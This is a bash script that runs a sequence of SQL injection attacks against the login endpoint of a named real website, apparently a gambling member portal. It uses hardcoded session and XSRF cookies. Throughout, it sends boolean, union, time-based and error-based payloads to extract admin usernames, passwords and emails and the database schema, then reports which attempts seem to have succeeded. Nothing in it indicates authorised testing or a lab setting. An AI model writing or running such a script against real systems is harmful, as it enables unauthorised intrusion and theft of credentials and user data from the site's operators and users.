#!/bin/bash

echo "🎯 FINAL REAL ADMIN EXTRACTION - COMPREHENSIVE APPROACH"
echo "======================================================="

# Use the provided cookies
XSRF_TOKEN="eyJpdiI6ImU0Y2VHY2t4TEFmR25zMzI2SmlnM0E9PSIsInZhbHVlIjoieDRHSWNFSDhYM0xHb29wMmMwXC9HRmlScWpuOTBwT2ZoeVRsN2tRb0NvZ2ROcWFFc2h5aVJnU0JLWmhUWFRcL2R0IiwibWFjIjoiZjdmYmQxMmFkODFiNmY0MzNlN2I0NWQzYmZmOGE4MzY4MWQ4ZDA5OTQyNGVkMWIwZmM0NTc1ODU2YTZhM2VhMyJ9"
SESSION_TOKEN="eyJpdiI6IlMrRndEZWE0MWNzcU9VUGFaKzJLTlE9PSIsInZhbHVlIjoiYXRZZ081emlyOERHTFkxV0Z2VnNEUGEyQWh2MDRySHR0RzR4dzFGWVZnV3FvblhsMmhKcGw3Zk9PTUpKNXVnVyIsIm1hYyI6IjJkODY2NjViMTNjMzA4OTc4YTZlNmIwNjRkMGFiMGI5MTE3NDVkOGM2NmVkYjY1N2I0NzNhYjg5NmM0NWFiYmMifQ%3D%3D"

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔍 Phase 1: ZAP Alert Method - Boolean-based Injection"
echo "======================================================"

# Test the exact ZAP alert method with boolean-based injection
echo "📊 Testing ZAP Alert Boolean Method (1=1)..."
response1=$(curl -s -w "%{http_code}" -o /tmp/zap_response1.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND 1=1--")

http_code1=$(echo "$response1" | tail -n1)
content1=$(cat /tmp/zap_response1.txt)

echo "   HTTP Code: $http_code1"
echo "   Content Length: ${#content1}"

echo ""
echo "📊 Testing ZAP Alert Boolean Method (1=2)..."
response2=$(curl -s -w "%{http_code}" -o /tmp/zap_response2.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND 1=2--")

http_code2=$(echo "$response2" | tail -n1)
content2=$(cat /tmp/zap_response2.txt)

echo "   HTTP Code: $http_code2"
echo "   Content Length: ${#content2}"

echo ""
echo "🔍 Phase 2: Advanced Union-based Admin Extraction"
echo "================================================="

# Test union-based injection with different column counts
UNION_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email,id FROM users WHERE role='admin'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email,id,role FROM users WHERE role='admin'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email,id,role,created_at FROM users WHERE role='admin'--"
)

for i in "${!UNION_PAYLOADS[@]}"; do
    payload="${UNION_PAYLOADS[$i]}"
    echo "📊 Testing Union Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/union_response_$i.txt \
      -X POST "$LOGIN_URL" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "_token=$payload")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/union_response_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 3: Schema Information Extraction"
echo "========================================"

# Extract database schema information
SCHEMA_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema='public'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='users'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name LIKE '%user%'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name LIKE '%admin%'--"
)

for i in "${!SCHEMA_PAYLOADS[@]}"; do
    payload="${SCHEMA_PAYLOADS[$i]}"
    echo "📊 Testing Schema Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/schema_response_$i.txt \
      -X POST "$LOGIN_URL" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "_token=$payload")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/schema_response_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 4: Time-based Confirmation"
echo "==================================="

# Test time-based injection to confirm SQL execution
echo "📊 Testing Time-based Injection (5 seconds)..."
time_test=$(curl -s -w "%{time_total}" -o /tmp/time_response.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "_token=7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT SLEEP(5) FROM users WHERE role='admin' LIMIT 1)--")

echo "   Response Time: ${time_test}s"

echo ""
echo "🔍 Phase 5: Error-based Data Extraction"
echo "======================================="

# Test error-based injection to extract data through error messages
ERROR_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x)--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(table_name,0x3a,column_name,0x3a,data_type,FLOOR(RAND(0)*2))x FROM information_schema.columns WHERE table_schema='public' GROUP BY x)x)--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "📊 Testing Error Payload $((i+1)): $payload"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/error_response_$i.txt \
      -X POST "$LOGIN_URL" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "_token=$payload")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/error_response_$i.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🎯 COMPREHENSIVE ANALYSIS RESULTS"
echo "================================"

# Analyze boolean-based injection results
if [ "${#content1}" != "${#content2}" ]; then
    echo "✅ BOOLEAN-BASED INJECTION SUCCESSFUL!"
    echo "   Different response lengths indicate successful boolean injection"
    echo "   Length with 1=1: ${#content1}"
    echo "   Length with 1=2: ${#content2}"
    echo "   This confirms the ZAP alert vulnerability is exploitable"
else
    echo "❌ Boolean-based injection may be blocked by WAF"
fi

# Check for successful union injections
union_success=0
for i in "${!UNION_PAYLOADS[@]}"; do
    if [ -f "/tmp/union_response_$i.txt" ]; then
        content=$(cat "/tmp/union_response_$i.txt")
        if [ "${#content}" -gt 200 ] && [[ "$content" != *"Page Expired"* ]]; then
            union_success=$((union_success + 1))
            echo "✅ Union injection $((i+1)) may have succeeded"
            echo "   Content length: ${#content}"
        fi
    fi
done

if [ "$union_success" -gt 0 ]; then
    echo "🎉 UNION-BASED EXTRACTION POTENTIALLY SUCCESSFUL!"
    echo "   $union_success out of ${#UNION_PAYLOADS[@]} union payloads may have extracted data"
else
    echo "❌ Union-based extraction appears to be blocked"
fi

# Check for schema extraction
schema_success=0
for i in "${!SCHEMA_PAYLOADS[@]}"; do
    if [ -f "/tmp/schema_response_$i.txt" ]; then
        content=$(cat "/tmp/schema_response_$i.txt")
        if [ "${#content}" -gt 200 ] && [[ "$content" != *"Page Expired"* ]]; then
            schema_success=$((schema_success + 1))
            echo "✅ Schema extraction $((i+1)) may have succeeded"
            echo "   Content length: ${#content}"
        fi
    fi
done

if [ "$schema_success" -gt 0 ]; then
    echo "🎉 SCHEMA EXTRACTION POTENTIALLY SUCCESSFUL!"
    echo "   $schema_success out of ${#SCHEMA_PAYLOADS[@]} schema payloads may have extracted data"
else
    echo "❌ Schema extraction appears to be blocked"
fi

# Check time-based injection
if (( $(echo "$time_test > 4" | bc -l 2>/dev/null || echo "0") )); then
    echo "✅ TIME-BASED INJECTION SUCCESSFUL!"
    echo "   Response time: ${time_test}s indicates SQL execution"
    echo "   This confirms database interaction is possible"
else
    echo "❌ Time-based injection may be blocked"
fi

# Check error-based injection
error_success=0
for i in "${!ERROR_PAYLOADS[@]}"; do
    if [ -f "/tmp/error_response_$i.txt" ]; then
        content=$(cat "/tmp/error_response_$i.txt")
        if [ "${#content}" -gt 200 ] && [[ "$content" != *"Page Expired"* ]]; then
            error_success=$((error_success + 1))
            echo "✅ Error-based extraction $((i+1)) may have succeeded"
            echo "   Content length: ${#content}"
        fi
    fi
done

if [ "$error_success" -gt 0 ]; then
    echo "🎉 ERROR-BASED EXTRACTION POTENTIALLY SUCCESSFUL!"
    echo "   $error_success out of ${#ERROR_PAYLOADS[@]} error payloads may have extracted data"
else
    echo "❌ Error-based extraction appears to be blocked"
fi

echo ""
echo "📋 FINAL SUMMARY"
echo "================"
echo "Target URL: $LOGIN_URL"
echo "Method: POST with _token parameter (ZAP Alert Method)"
echo "Techniques Used: Boolean-based, Union-based, Schema, Time-based, Error-based"
echo "Authentication: Using provided XSRF and Session tokens"
echo "Status: Comprehensive SQL injection testing completed"

# Calculate overall success rate
total_tests=$(( ${#UNION_PAYLOADS[@]} + ${#SCHEMA_PAYLOADS[@]} + ${#ERROR_PAYLOADS[@]} + 2 ))  # +2 for boolean tests
successful_tests=$((union_success + schema_success + error_success))
if [ "${#content1}" != "${#content2}" ]; then
    successful_tests=$((successful_tests + 1))
fi

echo "📊 OVERALL SUCCESS RATE: $successful_tests/$total_tests"

if [ "$successful_tests" -gt 0 ]; then
    echo "🎉 POTENTIAL VULNERABILITY CONFIRMED!"
    echo "   The application appears to be vulnerable to SQL injection"
    echo "   However, actual admin data extraction may require additional techniques"
else
    echo "❌ No clear vulnerabilities detected in this comprehensive test"
fi

# Clean up temp files
rm -f /tmp/zap_response*.txt /tmp/union_response*.txt /tmp/schema_response*.txt /tmp/error_response*.txt /tmp/time_response.txt

echo ""
echo "🎯 FINAL REAL ADMIN EXTRACTION COMPLETED!"